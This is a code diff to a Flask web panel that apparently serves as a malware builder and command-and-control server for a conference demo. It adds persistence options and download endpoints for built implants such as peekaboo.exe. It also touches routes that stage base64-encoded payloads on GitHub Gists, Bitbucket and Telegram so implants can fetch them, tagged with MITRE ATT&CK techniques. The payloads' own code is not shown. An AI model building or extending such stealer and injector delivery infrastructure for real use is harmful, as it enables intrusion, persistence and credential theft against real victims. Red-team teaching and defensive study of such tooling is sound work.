@@ -12,7 +12,7 @@ import uuid
 from datetime import datetime
 from pathlib import Path
 
-from flask import Flask, Response, jsonify, render_template, request, stream_with_context
+from flask import Flask, Response, jsonify, render_template, request, send_file, stream_with_context
 
 try:
     import requests as _requests
@@ -50,7 +50,7 @@ def get_modules() -> dict:
     return {
         "crypto":      _dirs(MALWARE_DIR / "crypto"),
         "injection":   _dirs(MALWARE_DIR / "injection"),
-        "persistence": _stems(MALWARE_DIR / "persistence"),
+        "persistence": ["none"] + _stems(MALWARE_DIR / "persistence"),
         "stealer":     _stems(MALWARE_DIR / "stealer"),
         "payloads":    _stems(PAYLOADS_DIR),
     }
@@ -99,6 +99,7 @@ def _run_build(build_id: str, params: dict) -> None:
         "-m", params.get("malware", "injection"),
         "-i", params.get("injection", "virtualallocex"),
         "-s", params.get("stealer", "telegram"),
+        "-r", params.get("persistence", "none"),
     ]
 
     try:
@@ -155,6 +156,50 @@ def api_build_status(build_id: str):
     if not job:
         return jsonify({"error": "not found"}), 404
     return jsonify(job)
+
+
+@app.route("/api/build/<build_id>/files")
+def api_build_files(build_id: str):
+    with _lock:
+        job = dict(_builds.get(build_id, {}))
+    if not job:
+        return jsonify({"error": "not found"}), 404
+    if job.get("status") != "success":
+        return jsonify({"files": []})
+    params = job.get("params", {})
+    injection = params.get("injection", "virtualallocex")
+    persistence = params.get("persistence", "none")
+    out_dir = MALWARE_DIR / "injection" / injection
+    files = []
+    peekaboo = out_dir / "peekaboo.exe"
+    if peekaboo.exists():
+        files.append({"name": "peekaboo.exe", "size": peekaboo.stat().st_size})
+    if persistence != "none":
+        pers_exe = out_dir / "persistence.exe"
+        if pers_exe.exists():
+            files.append({"name": "persistence.exe", "size": pers_exe.stat().st_size,
+                          "technique": persistence})
+    return jsonify({"files": files, "build_id": build_id})
+
+
+@app.route("/api/build/<build_id>/download/<filename>")
+def api_build_download(build_id: str, filename: str):
+    allowed = {"peekaboo.exe", "persistence.exe"}
+    if filename not in allowed:
+        return jsonify({"error": "not allowed"}), 400
+    with _lock:
+        job = dict(_builds.get(build_id, {}))
+    if not job:
+        return jsonify({"error": "not found"}), 404
+    if job.get("status") != "success":
+        return jsonify({"error": "build not successful"}), 400
+    params = job.get("params", {})
+    injection = params.get("injection", "virtualallocex")
+    file_path = MALWARE_DIR / "injection" / injection / filename
+    if not file_path.exists():
+        return jsonify({"error": f"{filename} not found"}), 404
+    return send_file(file_path, as_attachment=True, download_name=filename,
+                     mimetype="application/octet-stream")
 
 
 @app.route("/api/beacons")
@@ -319,7 +364,7 @@ def c2_deliver_telegram():
 
     binary = _find_latest_binary()
     if not binary:
-        return jsonify({"ok": False, "error": "no built binary found — run the builder first"}), 400
+        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
 
     body = request.get_json(silent=True) or {}
     caption = body.get("caption",
@@ -360,7 +405,7 @@ def c2_deliver_telegram():
 def c2_deliver_github():
     """
     Drop the latest built binary as a GitHub Gist (base64-encoded).
-    Simulates: C2 staging via GitHub Gists — implant polls for new gists.
+    Simulates: C2 staging via GitHub Gists - implant polls for new gists.
     MITRE ATT&CK: T1102.001 (Dead Drop Resolver), T1105
     """
     if not HAS_REQUESTS:
@@ -376,11 +421,11 @@ def c2_deliver_github():
 
     binary = _find_latest_binary()
     if not binary:
-        return jsonify({"ok": False, "error": "no built binary found — run the builder first"}), 400
+        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
 
     body = request.get_json(silent=True) or {}
     description = body.get("description",
-        f"peekaboo payload drop — DEFCON Demo Labs 2026 — {datetime.utcnow().isoformat()}Z")
+        f"peekaboo payload drop - DEFCON Demo Labs 2026 - {datetime.utcnow().isoformat()}Z")
 
     try:
         encoded = base64.b64encode(binary.read_bytes()).decode()
@@ -392,7 +437,7 @@ def c2_deliver_github():
             "public": False,
             "files": {
                 f"{binary.stem}_b64.txt": {
-                    "content": f"# peekaboo payload — base64 encoded\n# decode: base64 -d <file> > payload.exe\n\n{encoded_chunked}\n"
+                    "content": f"# peekaboo payload - base64 encoded\n# decode: base64 -d <file> > payload.exe\n\n{encoded_chunked}\n"
                 },
                 "README.md": {
                     "content": (
@@ -401,7 +446,7 @@ def c2_deliver_github():
                         f"**size:** `{binary.stat().st_size}` bytes  \n"
                         f"**time:** `{datetime.utcnow().isoformat()}Z`  \n\n"
                         f"## decode\n```bash\nbase64 -d {binary.stem}_b64.txt > {binary.name}\n```\n\n"
-                        f"*DEFCON Demo Labs Singapore 2026 — by @cocomelonc*\n"
+                        f"*DEFCON Demo Labs Singapore 2026 - by @cocomelonc*\n"
                     )
                 }
             }
@@ -454,7 +499,7 @@ def c2_deliver_virustotal():
 
     binary = _find_latest_binary()
     if not binary:
-        return jsonify({"ok": False, "error": "no built binary found — run the builder first"}), 400
+        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
 
     try:
         with open(binary, "rb") as f:
@@ -476,7 +521,7 @@ def c2_deliver_virustotal():
                 "analysis_id": analysis_id,
                 "url":         f"https://www.virustotal.com/gui/file-analysis/{analysis_id}",
                 "technique":   "T1102",
-                "note":        "Analysis pending — check VirusTotal for detection results",
+                "note":        "Analysis pending - check VirusTotal for detection results",
             })
         else:
             return jsonify({"ok": False,
@@ -508,7 +553,7 @@ def c2_deliver_bitbucket():
 
     binary = _find_latest_binary()
     if not binary:
-        return jsonify({"ok": False, "error": "no built binary found — run the builder first"}), 400
+        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
 
     try:
         encoded = base64.b64encode(binary.read_bytes()).decode()
@@ -528,7 +573,7 @@ def c2_deliver_bitbucket():
             headers={"Authorization": f"Basic {token_b64}"},
             data={
                 filename: content,
-                "message": f"[peekaboo] payload drop {ts} — DEFCON Demo 2026",
+                "message": f"[peekaboo] payload drop {ts} - DEFCON Demo 2026",
                 "branch": "main",
             },
             timeout=20,
@@ -627,7 +672,7 @@ def api_scrape():
 
     t = threading.Thread(target=_scrape, daemon=True)
     t.start()
-    return jsonify({"ok": True, "message": "indexer started — check /api/chat/kb_info for status"})
+    return jsonify({"ok": True, "message": "indexer started - check /api/chat/kb_info for status"})
 
 
 if __name__ == "__main__":
